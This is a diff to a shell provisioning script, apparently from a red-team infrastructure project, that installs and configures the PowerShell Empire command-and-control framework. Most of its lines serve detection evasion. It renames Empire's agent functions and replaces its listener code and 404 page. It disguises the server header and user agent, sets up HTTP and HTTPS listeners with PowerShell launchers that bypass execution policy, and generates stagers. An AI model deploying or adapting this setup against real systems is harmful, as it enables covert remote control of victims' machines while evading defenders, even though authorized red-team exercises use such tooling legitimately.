@@ -9,14 +9,16 @@ sudo ln -s /usr/bin/python2.7 /usr/bin/python
 # download empire
 git clone https://github.com/EmpireProject/Empire
 cd Empire
+# use dev branch
+git checkout dev
 
 # modify Empire for defense evasion
 sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/stagers/http.ps1
 sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/agent.ps1
 
 # modify http 404 page for defense evasion (these files are uploaded: see main.tf)
-cp /tmp/custom-common-httpy.py ~/Empire/lib/common/http.py
 cp /tmp/custom-listener-http.py ~/Empire/lib/listeners/http.py
+sed -i 's/default_page(path_to_html_file\=\"empty\")/default_page(path_to_html_file\=\"\/tmp\/default-page\.html\")/' ~/Empire/lib/common/http.py
 
 # install empire
 RANDKEY=`cat /dev/urandom | tr -dc '0-9' | fold -w ${1:-32} | head -1`
@@ -35,7 +37,7 @@ set Host http://$EIP:80
 set DefaultProfile /content/uploads,/feeds/updated,/sitemap/poll|Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
 set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
 set DefaultJitter 0.3
-set ServerVersion Apache/2.4.1 (Unix) 
+set Headers Server:Apache/2.4.1 (Unix) 
 set StagerURI /download/20180421
 set Launcher powershell -WindowStyle 1 -sta -ExecutionPolicy bypass -noP -enc
 execute
@@ -46,7 +48,7 @@ set Host https://$EIP:443
 set DefaultProfile /content/uploads,/feeds/updated,/sitemap/poll|Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
 set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
 set DefaultJitter 0.3
-set ServerVersion Apache/2.4.1 (Unix)
+set Headers Server:Apache/2.4.1 (Unix)
 set StagerURI /download/20180421
 set Launcher powershell -WindowStyle 1 -sta -ExecutionPolicy bypass -noP -enc
 set CertPath /home/ubuntu/Empire/data/
@@ -72,10 +74,6 @@ unset OutFile
 generate
 EOF
 ) > startup.rc
-
-# modify Empire for defense evasion
-sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/stagers/http.ps1
-sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/agent.ps1
 
 # start empire
 screen -dmS empire sudo ./empire
